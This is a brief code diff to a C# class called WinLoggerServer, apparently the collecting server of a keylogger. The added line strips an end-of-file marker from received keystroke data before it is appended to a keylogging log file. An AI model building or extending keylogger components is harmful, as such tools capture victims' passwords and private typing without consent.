@@ -57,7 +57,7 @@ public class WinLoggerServer {
                         break;  
                     }  
                 }  
-
+                data = data.Replace("<EOF>", null);
                 // Append text to the keylogging file.
                 Console.WriteLine("Received some keys. Appended to '{0}'.", Globals.logfp);
                 File.AppendAllText(Globals.logfp, data + Environment.NewLine); 
